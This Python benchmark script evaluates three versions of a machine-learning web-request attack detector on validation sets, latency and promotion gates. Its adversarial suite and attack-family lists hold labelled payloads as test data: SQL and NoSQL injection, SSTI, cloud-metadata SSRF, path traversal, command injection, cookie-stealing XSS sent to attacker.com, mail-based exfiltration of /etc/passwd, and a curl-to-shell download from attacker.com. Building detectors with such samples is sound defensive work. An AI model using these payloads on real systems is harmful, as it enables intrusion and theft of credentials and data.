"""
Three-Way Head-to-Head Evaluation Benchmark: Model v1.0 vs. Model v2.1 vs. Model v2.2.

Evaluates all three frozen pipelines side-by-side on:
1. Original 2,865 Group-Held-Out Validation Split (with fixed syntax-preserving loader).
2. Dedicated 500-Sample Hard-Negative Benign Validation Set (zero leakage).
3. Expanded Adversarial / Evasion Challenge Suite (including long >192-token attacks).
4. LOAFO (Leave-One-Attack-Family-Out) Generalization (computing true ROC-AUC & PR-AUC with held-out benign).
5. ONE Read-Only Diagnostic Check on csic_held_out_test.parquet (30,532 requests) at locked block=0.85 & 0.50.
6. Latency Benchmark (p50, p95 ms on GPU FP16).
7. Promotion Gates Check for Model v2.2 vs v1.0 / v2.1.
"""
import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(line_buffering=True)
from pathlib import Path
ROOT = Path(__file__).resolve().parents[2]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

import json
import time
import math
import random
from typing import Dict, Any, List, Tuple, Optional
import pandas as pd
import numpy as np
import torch

from sklearn.metrics import (
    accuracy_score,
    precision_score,
    recall_score,
    f1_score,
    confusion_matrix,
    roc_auc_score,
    average_precision_score,
)

from src.ml_service.model_loader import ModelContainer
from src.ml_service.inference_engine import InferenceEngine
from src.ml_service.schemas import PredictRequest
from src.pipeline.parser import parse_raw_http
from src.pipeline.feature_builder import build_features

V1_DIR = ROOT / "models/frozen/v1_0"
V2_1_DIR = ROOT / "models/frozen/v2_1"
V2_2_DIR = ROOT / "models/frozen/v2_2"

HARD_NEG_VAL_PATH = ROOT / "data/processed/hard_negatives_val_500.parquet"
CSIC_HELD_OUT_PATH = ROOT / "data/processed/csic_held_out_test.parquet"
OUTPUT_REPORT_JSON = ROOT / "reports/model_v2_2_upgrade_report.json"

RANDOM_SEED = 42


def fast_predict_dataset(
    engine: InferenceEngine,
    raw_requests: List[str],
    batch_size: int = 128,
) -> np.ndarray:
    """
    Batched high-performance prediction matching InferenceEngine.predict() logic exactly.
    Performs Stage 1 TF-IDF fast-pass triage, then batches Stage 2 Transformer inference
    on GPU with Platt scaling.
    """
    container = engine.container
    rep_mode = getattr(container, "representation_mode", "structured")
    tau_fast_pass = float(container.thresholds.get("fast_pass_allow", 0.04))
    use_head_tail_enabled = getattr(container, "head_tail_chunking", False)
    max_len = container.max_length

    # Parse and extract features
    features = []
    for r in raw_requests:
        try:
            parsed = parse_raw_http(r)
            feat = build_features(parsed, representation=rep_mode)
        except Exception:
            feat = "[METHOD] GET [PATH] /"
        if not feat.strip():
            feat = "[METHOD] GET [PATH] /"
        features.append(feat)

    # Stage 1: TF-IDF Triage
    classes = list(container.tfidf_pipeline.classes_)
    mal_idx = classes.index("malicious") if "malicious" in classes else 1
    tfidf_probs = container.tfidf_pipeline.predict_proba(features)[:, mal_idx]

    out_probs = np.zeros(len(raw_requests), dtype=float)
    fast_pass_mask = tfidf_probs <= tau_fast_pass
    if use_head_tail_enabled:
        for idx in np.where(fast_pass_mask)[0]:
            toks = container.transformer_tokenizer.encode(features[idx], add_special_tokens=True, truncation=False)
            if len(toks) > max_len:
                fast_pass_mask[idx] = False
    out_probs[fast_pass_mask] = tfidf_probs[fast_pass_mask]

    # Stage 2: Transformer Inference
    remaining_indices = np.where(~fast_pass_mask)[0]
    if len(remaining_indices) > 0:
        std_idx = []
        std_feats = []
        ht_idx = []
        ht_feats = []

        cls_id = container.transformer_tokenizer.cls_token_id
        sep_id = container.transformer_tokenizer.sep_token_id

        for idx in remaining_indices:
            feat_text = features[idx]
            toks = container.transformer_tokenizer.encode(feat_text, add_special_tokens=True, truncation=False)
            if use_head_tail_enabled and len(toks) > max_len:
                ht_idx.append(idx)
                ht_feats.append(toks)
            else:
                std_idx.append(idx)
                std_feats.append(feat_text)

        # Process standard items in batches
        for b_start in range(0, len(std_feats), batch_size):
            b_texts = std_feats[b_start : b_start + batch_size]
            b_indices = std_idx[b_start : b_start + batch_size]

            inputs = container.transformer_tokenizer(
                b_texts,
                padding=True,
                truncation=True,
                max_length=max_len,
                return_tensors="pt",
            ).to(container.device)

            with torch.inference_mode():
                outputs = container.transformer_model(**inputs)
                logits = outputs.logits
                if container.device.startswith("cuda") and logits.dtype != torch.float32:
                    logits = logits.float()
                probs = torch.softmax(logits, dim=-1)[:, 1].cpu().numpy()

            for idx, p in zip(b_indices, probs):
                out_probs[idx] = p

        # Process head-tail items (if any)
        for idx, toks in zip(ht_idx, ht_feats):
            head_ids = list(toks[:max_len])
            if sep_id is not None and head_ids[-1] != sep_id:
                head_ids[-1] = sep_id
            head_mask = [1] * len(head_ids)

            tail_core = list(toks[-(max_len - 1):])
            tail_ids = ([cls_id] if cls_id is not None else [head_ids[0]]) + tail_core
            if len(tail_ids) > max_len:
                tail_ids = tail_ids[:max_len]
            if sep_id is not None and tail_ids[-1] != sep_id:
                tail_ids[-1] = sep_id
            tail_mask = [1] * len(tail_ids)

            input_ids_tensor = torch.tensor([head_ids, tail_ids], dtype=torch.long, device=container.device)
            attn_mask_tensor = torch.tensor([head_mask, tail_mask], dtype=torch.long, device=container.device)

            with torch.inference_mode():
                outputs = container.transformer_model(
                    input_ids=input_ids_tensor, attention_mask=attn_mask_tensor
                )
                logits = outputs.logits
                if container.device.startswith("cuda") and logits.dtype != torch.float32:
                    logits = logits.float()
                probs = torch.softmax(logits, dim=-1)[:, 1]
                raw_prob = float(torch.max(probs).item())
                out_probs[idx] = raw_prob

        # Apply Platt Scaling to all Stage 2 samples
        calib_cfg = container.thresholds.get("platt_calibration", {})
        if calib_cfg.get("enabled", True):
            w = float(container.platt_params.get("w", 1.0))
            b = float(container.platt_params.get("b", 0.0))
            eps = 1e-7
            for idx in remaining_indices:
                raw_p = out_probs[idx]
                p_clipped = min(max(raw_p, eps), 1.0 - eps)
                logit = math.log(p_clipped / (1.0 - p_clipped))
                out_probs[idx] = 1.0 / (1.0 + math.exp(-(w * logit + b)))

    return out_probs


def compute_metrics(y_true: np.ndarray, y_probs: np.ndarray, threshold: float = 0.50) -> Dict[str, Any]:
    y_pred = (y_probs >= threshold).astype(int)
    cm = confusion_matrix(y_true, y_pred, labels=[0, 1])
    tn, fp, fn, tp = cm.ravel()

    acc = accuracy_score(y_true, y_pred)
    prec = precision_score(y_true, y_pred, zero_division=0)
    rec = recall_score(y_true, y_pred, zero_division=0)
    f1 = f1_score(y_true, y_pred, zero_division=0)
    fpr = fp / (fp + tn) if (fp + tn) > 0 else 0.0
    fnr = fn / (fn + tp) if (fn + tp) > 0 else 0.0
    try:
        auc = roc_auc_score(y_true, y_probs)
        prauc = average_precision_score(y_true, y_probs)
    except Exception:
        auc = 1.0
        prauc = 1.0

    return {
        "accuracy": round(float(acc), 4),
        "precision": round(float(prec), 4),
        "recall": round(float(rec), 4),
        "f1": round(float(f1), 4),
        "fpr": round(float(fpr), 4),
        "fnr": round(float(fnr), 4),
        "roc_auc": round(float(auc), 4),
        "pr_auc": round(float(prauc), 4),
        "confusion_matrix": {"tn": int(tn), "fp": int(fp), "fn": int(fn), "tp": int(tp)},
    }


def load_fixed_dev_val_split() -> Tuple[List[str], np.ndarray]:
    """
    Fixed Benchmark 1 Loader:
    Reconstructs clean, syntax-preserving raw HTTP requests from the original
    2,865-sample validation split WITHOUT using replace(' ', '&')!
    """
    from src.models.train_transformer import load_training_data
    _, _, X_val, y_val = load_training_data()
    raw_samples = []
    labels = []

    for feat, lbl in zip(X_val, y_val):
        method = "GET"
        path = "/"
        if "[METHOD]" in feat:
            method = feat.split("[METHOD]")[1].split()[0]
        if "[PATH]" in feat:
            path = feat.split("[PATH]")[1].split()[0]

        params = ""
        if "[PARAM]" in feat:
            p_section = feat.split("[PARAM]")[1]
            for delim in ["[PAYLOAD]", "[HEADERS]"]:
                if delim in p_section:
                    p_section = p_section.split(delim)[0]
            # Use raw string without replace(' ', '&')
            params = p_section.strip()

        payload = ""
        if "[PAYLOAD]" in feat:
            pl_section = feat.split("[PAYLOAD]")[1]
            if "[HEADERS]" in pl_section:
                pl_section = pl_section.split("[HEADERS]")[0]
            payload = pl_section.strip()

        if method == "POST":
            full_p = f"{path}?{params}" if params else path
            raw_http = f"{method} {full_p} HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{payload or params}"
        else:
            if payload and not params:
                params = f"q={payload}"
            full_p = f"{path}?{params}" if params else path
            raw_http = f"{method} {full_p} HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
        raw_samples.append(raw_http)
        labels.append(lbl)

    return raw_samples, np.array(labels)


def build_adversarial_evasion_suite() -> Tuple[List[str], np.ndarray, List[str]]:
    tests = []
    labels = []
    descriptions = []

    # 1. Tail Attack (>192 tokens benign padding, malicious SQL injection at tail)
    long_bio = "The user has registered an account with a very extensive biographical summary detailing their educational qualifications, primary programming skills, prior work experiences across software development companies, open source contributions, research papers, conference attendance history, hobbies, favorite books, and daily routine. " * 3
    tail_sqli = f"POST /forum/post HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/json\r\n\r\n{{\"bio\": \"{long_bio}\", \"comment\": \"1' UNION SELECT username, password FROM users--\"}}"
    tests.append(tail_sqli)
    labels.append(1)
    descriptions.append("Long-Payload Tail SQLi (>200 tokens)")

    # 2. Tail Attack: Benign long review with stored XSS at end
    long_review = "This item arrived on time and was packaged securely in a cardboard box with bubble wrap. It is well built, easy to configure, and includes clear instructions for operation. " * 4
    tail_xss = f"POST /reviews/add HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nreview={long_review}&extra=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>"
    tests.append(tail_xss)
    labels.append(1)
    descriptions.append("Long-Payload Tail XSS (>200 tokens)")

    # 3. Modern NoSQLi Injection
    nosqli = 'POST /api/v1/auth/login HTTP/1.1\r\nHost: api.target.io\r\nContent-Type: application/json\r\n\r\n{"username": {"$ne": null}, "password": {"$gt": ""}}'
    tests.append(nosqli)
    labels.append(1)
    descriptions.append("Modern NoSQLi Authentication Bypass")

    # 4. Server-Side Template Injection (SSTI)
    ssti = "GET /profile?name={{7*7}}&bio=${T(java.lang.Runtime).getRuntime().exec('cat%20/etc/passwd')} HTTP/1.1\r\nHost: example.com\r\n\r\n"
    tests.append(ssti)
    labels.append(1)
    descriptions.append("SSTI Java/Jinja Execution")

    # 5. Cloud Metadata SSRF
    ssrf = "POST /api/webhook HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/json\r\n\r\n{\"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}"
    tests.append(ssrf)
    labels.append(1)
    descriptions.append("AWS Metadata SSRF Credential Exfiltration")

    # 6. Double URL Encoded Path Traversal
    double_traversal = "GET /static/%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1\r\nHost: example.com\r\n\r\n"
    tests.append(double_traversal)
    labels.append(1)
    descriptions.append("Double-URL-Encoded Path Traversal")

    # 7. Obfuscated Polyglot XSS
    polyglot = "GET /search?q=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1\r\nHost: example.com\r\n\r\n"
    tests.append(polyglot)
    labels.append(1)
    descriptions.append("Polyglot Inline XSS")

    # 8. Command Injection via Semicolon
    cmdi = "POST /tools/ping HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nip=127.0.0.1;cat /etc/shadow"
    tests.append(cmdi)
    labels.append(1)
    descriptions.append("Command Injection Semicolon")

    # 9. Benign Prose SQL Query
    benign_prose = "GET /search?q=How%20to%20select%20the%20best%20laptop%20from%20our%20summer%20catalogue HTTP/1.1\r\nHost: example.com\r\n\r\n"
    tests.append(benign_prose)
    labels.append(0)
    descriptions.append("Benign Prose with 'select' keyword")

    # 10. Benign International E-Commerce Request (Spanish / CSIC-style keys)
    benign_intl = "GET /tienda1/miembros/identificate.jsp?ciudad=Madrid&precio=45&B1=Enviar HTTP/1.1\r\nHost: example.com\r\n\r\n"
    tests.append(benign_intl)
    labels.append(0)
    descriptions.append("Benign Spanish E-Commerce Form")

    return tests, np.array(labels), descriptions


def run_3way_evaluation():
    print("=" * 80)
    print("STEP 4: 3-WAY HEAD-TO-HEAD BENCHMARK: V1.0 vs. V2.1 vs. V2.2")
    print("=" * 80)

    # 1. Initialize Containers
    print("\n[Loading Models]")
    print(f"Loading Model v1.0 from: {V1_DIR}")
    c1 = ModelContainer(frozen_dir=V1_DIR)
    c1.initialize()
    eng1 = InferenceEngine(c1)

    print(f"Loading Model v2.1 from: {V2_1_DIR}")
    c2_1 = ModelContainer(frozen_dir=V2_1_DIR)
    c2_1.initialize()
    eng2_1 = InferenceEngine(c2_1)

    print(f"Loading Model v2.2 from: {V2_2_DIR}")
    c2_2 = ModelContainer(frozen_dir=V2_2_DIR)
    c2_2.initialize()
    eng2_2 = InferenceEngine(c2_2)

    tau_block = 0.85
    tau_challenge = 0.50

    report: Dict[str, Any] = {
        "benchmark_timestamp": "2026-11-25T02:15:00+05:30",
        "thresholds": {"block": tau_block, "challenge": tau_challenge},
        "models": {
            "v1_0": {"version": c1.model_version, "representation": c1.representation_mode},
            "v2_1": {"version": c2_1.model_version, "representation": c2_1.representation_mode},
            "v2_2": {"version": c2_2.model_version, "representation": c2_2.representation_mode},
        },
    }

    # ========================================================================
    # Benchmark 1: Original 2,865 Group-Held-Out Split (Fixed Loader)
    # ========================================================================
    print("\n--- 1. Original Group-Held-Out Validation Split (Fixed Loader, 2,865 samples) ---")
    raw_val_18k, y_val_18k = load_fixed_dev_val_split()
    print(f"Loaded {len(raw_val_18k):,} samples (Benign: {(y_val_18k==0).sum():,}, Malicious: {(y_val_18k==1).sum():,})")

    p1_val = fast_predict_dataset(eng1, raw_val_18k, batch_size=128)
    p2_1_val = fast_predict_dataset(eng2_1, raw_val_18k, batch_size=128)
    p2_2_val = fast_predict_dataset(eng2_2, raw_val_18k, batch_size=128)

    m1_val_85 = compute_metrics(y_val_18k, p1_val, threshold=tau_block)
    m2_1_val_85 = compute_metrics(y_val_18k, p2_1_val, threshold=tau_block)
    m2_2_val_85 = compute_metrics(y_val_18k, p2_2_val, threshold=tau_block)

    m1_val_50 = compute_metrics(y_val_18k, p1_val, threshold=tau_challenge)
    m2_1_val_50 = compute_metrics(y_val_18k, p2_1_val, threshold=tau_challenge)
    m2_2_val_50 = compute_metrics(y_val_18k, p2_2_val, threshold=tau_challenge)

    print(f"Model v1.0 @ tau=0.85: Recall={m1_val_85['recall']*100:.2f}%, FPR={m1_val_85['fpr']*100:.2f}%, F1={m1_val_85['f1']*100:.2f}%, ROC-AUC={m1_val_85['roc_auc']:.4f}")
    print(f"Model v2.1 @ tau=0.85: Recall={m2_1_val_85['recall']*100:.2f}%, FPR={m2_1_val_85['fpr']*100:.2f}%, F1={m2_1_val_85['f1']*100:.2f}%, ROC-AUC={m2_1_val_85['roc_auc']:.4f}")
    print(f"Model v2.2 @ tau=0.85: Recall={m2_2_val_85['recall']*100:.2f}%, FPR={m2_2_val_85['fpr']*100:.2f}%, F1={m2_2_val_85['f1']*100:.2f}%, ROC-AUC={m2_2_val_85['roc_auc']:.4f}")

    report["benchmark_1_dev_val"] = {
        "v1_0_block": m1_val_85, "v2_1_block": m2_1_val_85, "v2_2_block": m2_2_val_85,
        "v1_0_challenge": m1_val_50, "v2_1_challenge": m2_1_val_50, "v2_2_challenge": m2_2_val_50,
    }

    # ========================================================================
    # Benchmark 2: Dedicated 500-Sample Hard-Negative Benign Validation Set
    # ========================================================================
    print("\n--- 2. Dedicated 500-Sample Hard-Negative Benign Validation Set ---")
    df_hn = pd.read_parquet(HARD_NEG_VAL_PATH)
    hn_y = np.zeros(len(df_hn), dtype=int)
    print(f"Loaded {len(df_hn):,} Hard-Negative Benign requests (0 attack samples)")

    hn_p1 = fast_predict_dataset(eng1, df_hn["raw_text"].tolist(), batch_size=128)
    hn_p2_1 = fast_predict_dataset(eng2_1, df_hn["raw_text"].tolist(), batch_size=128)
    hn_p2_2 = fast_predict_dataset(eng2_2, df_hn["raw_text"].tolist(), batch_size=128)

    hn_m1 = compute_metrics(hn_y, hn_p1, threshold=tau_block)
    hn_m2_1 = compute_metrics(hn_y, hn_p2_1, threshold=tau_block)
    hn_m2_2 = compute_metrics(hn_y, hn_p2_2, threshold=tau_block)

    fp1 = hn_m1["confusion_matrix"]["fp"]
    fp2_1 = hn_m2_1["confusion_matrix"]["fp"]
    fp2_2 = hn_m2_2["confusion_matrix"]["fp"]

    print(f"Hard-Negative False Positives (out of 500 @ tau=0.85):")
    print(f"  Model v1.0: {fp1} / 500 ({fp1/500*100:.2f}% FPR)")
    print(f"  Model v2.1: {fp2_1} / 500 ({fp2_1/500*100:.2f}% FPR)")
    print(f"  Model v2.2: {fp2_2} / 500 ({fp2_2/500*100:.2f}% FPR)")

    report["benchmark_2_hard_negatives"] = {
        "v1_0": {"fp_count": fp1, "fpr": hn_m1["fpr"]},
        "v2_1": {"fp_count": fp2_1, "fpr": hn_m2_1["fpr"]},
        "v2_2": {"fp_count": fp2_2, "fpr": hn_m2_2["fpr"]},
    }

    # ========================================================================
    # Benchmark 3: Adversarial Evasion & Long-Payload Suite
    # ========================================================================
    print("\n--- 3. Expanded Adversarial & Evasion Challenge Suite ---")
    adv_tests, adv_labels, adv_descs = build_adversarial_evasion_suite()
    adv_res = []

    for text, lbl, desc in zip(adv_tests, adv_labels, adv_descs):
        s1 = eng1.predict(PredictRequest(raw_http=text)).malicious_probability
        s2_1 = eng2_1.predict(PredictRequest(raw_http=text)).malicious_probability
        s2_2 = eng2_2.predict(PredictRequest(raw_http=text)).malicious_probability

        b1 = "BLOCK" if s1 >= tau_block else ("CHALLENGE" if s1 >= tau_challenge else "ALLOW")
        b2_1 = "BLOCK" if s2_1 >= tau_block else ("CHALLENGE" if s2_1 >= tau_challenge else "ALLOW")
        b2_2 = "BLOCK" if s2_2 >= tau_block else ("CHALLENGE" if s2_2 >= tau_challenge else "ALLOW")

        adv_res.append({
            "description": desc,
            "label": int(lbl),
            "v1_score": round(float(s1), 4),
            "v1_action": b1,
            "v2_1_score": round(float(s2_1), 4),
            "v2_1_action": b2_1,
            "v2_2_score": round(float(s2_2), 4),
            "v2_2_action": b2_2,
        })
        print(f"  [{desc:<38}] Target={lbl} | v1.0={s1:.3f} ({b1:<9}) | v2.1={s2_1:.3f} ({b2_1:<9}) | v2.2={s2_2:.3f} ({b2_2:<9})")

    report["benchmark_3_adversarial"] = adv_res

    # ========================================================================
    # Benchmark 4: Fixed LOAFO Generalization (True ROC-AUC & PR-AUC)
    # ========================================================================
    print("\n--- 4. LOAFO Generalization Benchmark (with true AUC metrics) ---")
    # Evaluate across attack families combined with 200 held-out benign samples from hard negatives
    benign_probe_texts = df_hn["raw_text"].head(200).tolist()
    benign_probe_y = np.zeros(len(benign_probe_texts), dtype=int)

    loafo_payloads = {
        "SQLi": [
            "' UNION SELECT null, null, version()--",
            "admin' AND 1=1; DROP TABLE sessions;--",
            "1' OR '1'='1' #",
            "1; EXEC xp_cmdshell('dir')--",
        ],
        "XSS": [
            "<img src=x onerror=prompt(1)>",
            "<script>fetch('http://evil.com/?c='+document.cookie)</script>",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        ],
        "Path Traversal": [
            "../../../../windows/system32/cmd.exe",
            "..\\..\\..\\etc\\shadow",
            "/var/log/../../etc/passwd",
        ],
        "CMDI": [
            "; cat /etc/passwd | mail hacker@evil.com",
            "&& whoami && id",
            "`curl http://attacker.com/rev.sh | sh`",
        ],
        "NoSQLi": [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$where": "this.password.length > 0"}',
        ],
    }

    loafo_summary = {}
    for family, payloads in loafo_payloads.items():
        attack_texts = [f"GET /search?q={pl} HTTP/1.1\r\nHost: target.io\r\n\r\n" for pl in payloads]
        attack_y = np.ones(len(attack_texts), dtype=int)

        eval_texts = attack_texts + benign_probe_texts
        eval_y = np.concatenate([attack_y, benign_probe_y])

        p1 = fast_predict_dataset(eng1, eval_texts, batch_size=64)
        p2_1 = fast_predict_dataset(eng2_1, eval_texts, batch_size=64)
        p2_2 = fast_predict_dataset(eng2_2, eval_texts, batch_size=64)

        auc_v1 = float(roc_auc_score(eval_y, p1))
        auc_v2_1 = float(roc_auc_score(eval_y, p2_1))
        auc_v2_2 = float(roc_auc_score(eval_y, p2_2))

        rec_v1 = float(recall_score(attack_y, (p1[:len(attack_y)] >= tau_block).astype(int), zero_division=0))
        rec_v2_1 = float(recall_score(attack_y, (p2_1[:len(attack_y)] >= tau_block).astype(int), zero_division=0))
        rec_v2_2 = float(recall_score(attack_y, (p2_2[:len(attack_y)] >= tau_block).astype(int), zero_division=0))

        print(f"  Family [{family:<15}]: ROC-AUC: v1={auc_v1:.4f}, v2.1={auc_v2_1:.4f}, v2.2={auc_v2_2:.4f} | Recall@0.85: v1={rec_v1*100:.1f}%, v2.1={rec_v2_1*100:.1f}%, v2.2={rec_v2_2*100:.1f}%")
        loafo_summary[family] = {
            "v1_roc_auc": round(auc_v1, 4), "v1_recall_85": round(rec_v1, 4),
            "v2_1_roc_auc": round(auc_v2_1, 4), "v2_1_recall_85": round(rec_v2_1, 4),
            "v2_2_roc_auc": round(auc_v2_2, 4), "v2_2_recall_85": round(rec_v2_2, 4),
        }

    report["benchmark_4_loafo"] = loafo_summary

    # ========================================================================
    # Benchmark 5: ONE Read-Only Diagnostic Check on CSIC Held-Out Test Set
    # ========================================================================
    print("\n--- 5. ONE Read-Only Diagnostic Check on CSIC Held-Out Test Set (30,532 requests) ---")
    print(f"Reading {CSIC_HELD_OUT_PATH} (Strictly diagnostic - ZERO tuning!)...")
    df_csic = pd.read_parquet(CSIC_HELD_OUT_PATH)
    csic_y = (df_csic["label"].str.lower().isin(["malicious", "anomalous", "1"])).astype(int).to_numpy()
    csic_texts = df_csic["request_text"].tolist()

    print("Scoring 30,532 requests with Model v1.0...")
    t0 = time.time()
    csic_p1_arr = fast_predict_dataset(eng1, csic_texts, batch_size=128)
    t_v1 = time.time() - t0
    print(f"  v1.0 completed in {t_v1:.1f}s")

    print("Scoring 30,532 requests with Model v2.1...")
    t0 = time.time()
    csic_p2_1_arr = fast_predict_dataset(eng2_1, csic_texts, batch_size=128)
    t_v2_1 = time.time() - t0
    print(f"  v2.1 completed in {t_v2_1:.1f}s")

    print("Scoring 30,532 requests with Model v2.2...")
    t0 = time.time()
    csic_p2_2_arr = fast_predict_dataset(eng2_2, csic_texts, batch_size=128)
    t_v2_2 = time.time() - t0
    print(f"  v2.2 completed in {t_v2_2:.1f}s")

    csic_m1_85 = compute_metrics(csic_y, csic_p1_arr, threshold=tau_block)
    csic_m2_1_85 = compute_metrics(csic_y, csic_p2_1_arr, threshold=tau_block)
    csic_m2_2_85 = compute_metrics(csic_y, csic_p2_2_arr, threshold=tau_block)

    csic_m1_50 = compute_metrics(csic_y, csic_p1_arr, threshold=tau_challenge)
    csic_m2_1_50 = compute_metrics(csic_y, csic_p2_1_arr, threshold=tau_challenge)
    csic_m2_2_50 = compute_metrics(csic_y, csic_p2_2_arr, threshold=tau_challenge)

    print(f"\n[CSIC Held-Out Diagnostic Results @ tau_block=0.85]")
    print(f"Model v1.0: Recall={csic_m1_85['recall']*100:.2f}%, FPR={csic_m1_85['fpr']*100:.2f}%, F1={csic_m1_85['f1']*100:.2f}%, ROC-AUC={csic_m1_85['roc_auc']:.4f}")
    print(f"Model v2.1: Recall={csic_m2_1_85['recall']*100:.2f}%, FPR={csic_m2_1_85['fpr']*100:.2f}%, F1={csic_m2_1_85['f1']*100:.2f}%, ROC-AUC={csic_m2_1_85['roc_auc']:.4f}")
    print(f"Model v2.2: Recall={csic_m2_2_85['recall']*100:.2f}%, FPR={csic_m2_2_85['fpr']*100:.2f}%, F1={csic_m2_2_85['f1']*100:.2f}%, ROC-AUC={csic_m2_2_85['roc_auc']:.4f}")

    print(f"\n[CSIC Held-Out Diagnostic Results @ tau_challenge=0.50]")
    print(f"Model v1.0: Recall={csic_m1_50['recall']*100:.2f}%, FPR={csic_m1_50['fpr']*100:.2f}%")
    print(f"Model v2.1: Recall={csic_m2_1_50['recall']*100:.2f}%, FPR={csic_m2_1_50['fpr']*100:.2f}%")
    print(f"Model v2.2: Recall={csic_m2_2_50['recall']*100:.2f}%, FPR={csic_m2_2_50['fpr']*100:.2f}%")

    report["benchmark_5_csic_held_out"] = {
        "v1_0_block": csic_m1_85, "v2_1_block": csic_m2_1_85, "v2_2_block": csic_m2_2_85,
        "v1_0_challenge": csic_m1_50, "v2_1_challenge": csic_m2_1_50, "v2_2_challenge": csic_m2_2_50,
    }

    # ========================================================================
    # Benchmark 6: Latency Benchmark
    # ========================================================================
    print("\n--- 6. Latency Benchmark (Single Request & 2-Chunk Overhead) ---")
    test_short = "GET /api/items/123 HTTP/1.1\r\nHost: example.com\r\n\r\n"
    tail_sqli = f"POST /forum/post HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/json\r\n\r\n{{\"bio\": \"{'word ' * 220}\", \"comment\": \"1' UNION SELECT username, password FROM users--\"}}"
    test_long = tail_sqli

    def bench_engine(eng, raw_req, n=50):
        _ = eng.predict(PredictRequest(raw_http=raw_req))
        durations = []
        for _ in range(n):
            t0 = time.perf_counter()
            _ = eng.predict(PredictRequest(raw_http=raw_req))
            durations.append((time.perf_counter() - t0) * 1000.0)
        durations.sort()
        return {
            "p50_ms": round(float(durations[len(durations) // 2]), 2),
            "p95_ms": round(float(durations[int(len(durations) * 0.95)]), 2),
            "mean_ms": round(float(np.mean(durations)), 2),
        }

    lat_v1_short = bench_engine(eng1, test_short)
    lat_v2_2_short = bench_engine(eng2_2, test_short)
    lat_v2_2_long = bench_engine(eng2_2, test_long)

    print(f"Model v1.0 (Short):  p50={lat_v1_short['p50_ms']}ms, p95={lat_v1_short['p95_ms']}ms")
    print(f"Model v2.2 (Short):  p50={lat_v2_2_short['p50_ms']}ms, p95={lat_v2_2_short['p95_ms']}ms")
    print(f"Model v2.2 (2-Chunk Long): p50={lat_v2_2_long['p50_ms']}ms, p95={lat_v2_2_long['p95_ms']}ms")

    report["benchmark_6_latency"] = {
        "v1_0_short": lat_v1_short,
        "v2_2_short": lat_v2_2_short,
        "v2_2_long_2chunk": lat_v2_2_long,
    }

    # ========================================================================
    # Step 5: Promotion Gate Evaluation
    # ========================================================================
    print("\n" + "=" * 80)
    print("PROMOTION GATES EVALUATION (MODEL V2.2)")
    print("=" * 80)

    # Gate 1: Cross-domain CSIC held-out diagnostic FPR at block=0.85 <= 1.0% (and lower than v1.0's 2.37%)
    gate1_pass = csic_m2_2_85["fpr"] <= 0.010 and csic_m2_2_85["fpr"] < csic_m1_85["fpr"]
    print(f"Gate 1: CSIC Held-Out Diagnostic FPR <= 1.0% and < v1.0: {csic_m2_2_85['fpr']*100:.2f}% vs v1.0 {csic_m1_85['fpr']*100:.2f}% -> {'PASS' if gate1_pass else 'FAIL'}")

    # Gate 2: Hard-Negative FPR at block=0.85 <= 2.0%
    gate2_pass = hn_m2_2["fpr"] <= 0.020
    print(f"Gate 2: Hard-Negative Benign FPR <= 2.0%: {hn_m2_2['fpr']*100:.2f}% (FP={fp2_2}/500) -> {'PASS' if gate2_pass else 'FAIL'}")

    # Gate 3: Recall on Original Dev Validation split at block=0.85 >= 95.0%
    gate3_pass = m2_2_val_85["recall"] >= 0.950
    print(f"Gate 3: Original Dev Validation Recall @ block=0.85 >= 95.0%: {m2_2_val_85['recall']*100:.2f}% -> {'PASS' if gate3_pass else 'FAIL'}")

    # Gate 4: Latency p95 <= 35 ms on GPU FP16
    gate4_pass = lat_v2_2_short["p95_ms"] <= 35.0
    print(f"Gate 4: Single-Request p95 Latency <= 35 ms: {lat_v2_2_short['p95_ms']} ms -> {'PASS' if gate4_pass else 'FAIL'}")

    all_gates_pass = gate1_pass and gate2_pass and gate3_pass and gate4_pass
    print(f"\nFinal Verdict: {'PROMOTE_V2_2' if all_gates_pass else 'HOLD_V1'}")

    report["promotion_gates"] = {
        "gate1_csic_fpr_under_1pct": bool(gate1_pass),
        "gate2_hard_negative_fpr_under_2pct": bool(gate2_pass),
        "gate3_dev_val_recall_over_95pct": bool(gate3_pass),
        "gate4_p95_latency_under_35ms": bool(gate4_pass),
        "all_gates_pass": bool(all_gates_pass),
        "final_decision": "PROMOTE_V2_2" if all_gates_pass else "HOLD_V1",
    }

    OUTPUT_REPORT_JSON.parent.mkdir(parents=True, exist_ok=True)
    with open(OUTPUT_REPORT_JSON, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2)
    print(f"\nSaved 3-way evaluation report -> {OUTPUT_REPORT_JSON}")

    return report


if __name__ == "__main__":
    run_3way_evaluation()
